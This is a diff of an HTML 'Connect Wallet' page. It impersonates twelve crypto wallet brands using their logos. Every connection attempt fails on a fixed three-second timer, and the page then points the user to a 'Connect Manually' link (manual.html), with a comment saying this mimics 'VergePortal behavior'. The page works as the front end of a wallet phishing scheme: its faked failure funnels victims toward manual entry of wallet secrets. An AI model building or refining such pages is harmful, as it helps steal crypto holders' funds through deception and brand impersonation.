@@ -1,65 +1,223 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Connect Wallet</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <style>
-    body {
-      margin: 0;
-      font-family: system-ui, sans-serif;
-      background: #0f172a;
-      color: #fff;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Wallet | Secure Portal</title>
+    <style>
+        :root {
+            --bg: #0f1217;
+            --card-bg: #161b22;
+            --item-bg: #21262d;
+            --border: #30363d;
+            --accent: #58a6ff;
+            --text-main: #ffffff;
+            --text-dim: #8b949e;
+        }
 
-    .container {
-      max-width: 420px;
-      margin: 100px auto;
-      background: #020617;
-      padding: 30px;
-      border-radius: 12px;
-      text-align: center;
-    }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            background-color: var(--bg);
+            color: var(--text-main);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+            display: flex; justify-content: center; align-items: center; min-height: 100vh;
+            padding: 20px;
+        }
 
-    p {
-      color: #94a3b8;
-    }
+        .container { width: 100%; max-width: 480px; }
 
-    .wallet {
-      width: 100%;
-      padding: 14px;
-      margin-top: 10px;
-      background: #020617;
-      border: 1px solid #1e293b;
-      color: #fff;
-      font-size: 16px;
-      border-radius: 8px;
-      cursor: pointer;
-    }
+        .card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 24px;
+            padding: 30px;
+            text-align: center;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+        }
 
-    .wallet:hover {
-      background: #1e293b;
-    }
-  </style>
+        .logo-top { width: 60px; height: 60px; margin-bottom: 20px; }
+        
+        h1 { font-size: 24px; font-weight: 700; margin-bottom: 8px; }
+        h6 { color: var(--text-dim); font-size: 14px; margin-bottom: 30px; font-weight: 400; }
+
+        .wallet-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            max-height: 480px;
+            overflow-y: auto;
+            padding: 10px;
+        }
+
+        /* Scrollbar styling */
+        .wallet-grid::-webkit-scrollbar { width: 4px; }
+        .wallet-grid::-webkit-scrollbar-thumb { background: var(--border); border-radius: 10px; }
+
+        .wallet-item {
+            background: var(--item-bg);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 15px 10px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .wallet-item:hover {
+            border-color: var(--accent);
+            background: #2d333b;
+            transform: translateY(-3px);
+        }
+
+        .wallet-icon {
+            width: 45px;
+            height: 45px;
+            object-fit: contain;
+            margin-bottom: 10px;
+            border-radius: 8px;
+        }
+
+        .wallet-name {
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--text-main);
+        }
+
+        /* Connecting Modal State */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.85);
+            z-index: 1000;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(5px);
+        }
+
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #30363d;
+            border-top: 4px solid var(--accent);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .error-msg {
+            color: #ff7b72;
+            display: none;
+            margin-top: 15px;
+            font-size: 14px;
+        }
+
+        .btn-manual {
+            display: none;
+            margin-top: 20px;
+            background: var(--accent);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 10px;
+            text-decoration: none;
+            font-weight: 600;
+        }
+    </style>
 </head>
 <body>
 
-  <div class="container">
-    <h1>Connect Wallet</h1>
-    <p>Select a wallet to continue</p>
+<div id="connectingModal" class="modal-overlay">
+    <div id="spinner" class="loader"></div>
+    <h2 id="modalTitle">Initializing Connection...</h2>
+    <p id="errorTxt" class="error-msg">Unable to establish secure connection</p>
+    <a href="manual.html" id="manualBtn" class="btn-manual">Connect Manually</a>
+</div>
 
-    <button class="wallet" onclick="goNext('MetaMask')">MetaMask</button>
-    <button class="wallet" onclick="goNext('Trust Wallet')">Trust Wallet</button>
-    <button class="wallet" onclick="goNext('Coinbase')">Coinbase</button>
-    <button class="wallet" onclick="goNext('Phantom')">Phantom</button>
-  </div>
+<div class="container">
+    <div class="card">
+        <img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.png" class="logo-top" alt="Logo">
+        <h1>Connect Wallet</h1>
+        <h6>Please connect your wallet to continue</h6>
 
-  <script>
-    function goNext(wallet) {
-      sessionStorage.setItem("wallet", wallet);
-      window.location.href = "/processing.html";
+        <div class="wallet-grid">
+            <div class="wallet-item" onclick="handleConnect('Trust Wallet')">
+                <img src="https://assets.pancakeswap.finance/web/wallets/trust.png" class="wallet-icon">
+                <span class="wallet-name">Trust</span>
+            </div>
+            <div class="wallet-item" onclick="handleConnect('MetaMask')">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="wallet-icon">
+                <span class="wallet-name">MetaMask</span>
+            </div>
+            <div class="wallet-item" onclick="handleConnect('Coinbase')">
+                <img src="https://assets.pancakeswap.finance/web/wallets/coinbase.png" class="wallet-icon">
+                <span class="wallet-name">Coinbase</span>
+            </div>
+            <div class="wallet-item" onclick="handleConnect('Phantom')">
+                <img src="https://raw.githubusercontent.com/phantom-labs/brand-assets/main/logos/icon/purple.png" class="wallet-icon">
+                <span class="wallet-name">Phantom</span>
+            </div>
+            <div class="wallet-item" onclick="handleConnect('Ledger')">
+                <img src="https://www.ledger.com/wp-content/uploads/2021/11/Ledger_favicon.png" class="wallet-icon">
+                <span class="wallet-name">Ledger</span>
+            </div>
+            <div class="wallet-item" onclick="handleConnect('Exodus')">
+                <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/exodus.png" class="wallet-icon">
+                <span class="wallet-name">Exodus</span>
+            </div>
+            <div class="wallet-item" onclick="handleConnect('Binance')">
+                <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/bnb.png" class="wallet-icon">
+                <span class="wallet-name">Binance</span>
+            </div>
+            <div class="wallet-item" onclick="handleConnect('SafePal')">
+                <img src="https://safepal.com/favicon.ico" class="wallet-icon">
+                <span class="wallet-name">SafePal</span>
+            </div>
+            <div class="wallet-item" onclick="handleConnect('OKX')">
+                <img src="https://www.okx.com/favicon.ico" class="wallet-icon">
+                <span class="wallet-name">OKX</span>
+            </div>
+            <div class="wallet-item" onclick="handleConnect('Uniswap')">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Uniswap_Logo.svg" class="wallet-icon">
+                <span class="wallet-name">Uniswap</span>
+            </div>
+            <div class="wallet-item" onclick="handleConnect('Rabby')">
+                <img src="https://rabby.io/assets/images/logo.png" class="wallet-icon">
+                <span class="wallet-name">Rabby</span>
+            </div>
+            <div class="wallet-item" onclick="handleConnect('Rainbow')">
+                <img src="https://rainbow.me/favicon.png" class="wallet-icon">
+                <span class="wallet-name">Rainbow</span>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    function handleConnect(walletName) {
+        const modal = document.getElementById('connectingModal');
+        const spinner = document.getElementById('spinner');
+        const title = document.getElementById('modalTitle');
+        const error = document.getElementById('errorTxt');
+        const manualBtn = document.getElementById('manualBtn');
+
+        modal.style.display = 'flex';
+        title.innerText = "Connecting to " + walletName + "...";
+
+        // Mimic VergePortal behavior: spin for a bit, then show error/manual connect
+        setTimeout(() => {
+            spinner.style.display = 'none';
+            title.innerText = "Connection Failed";
+            error.style.display = 'block';
+            manualBtn.style.display = 'block';
+        }, 3000);
     }
-  </script>
+</script>
 
 </body>
 </html>
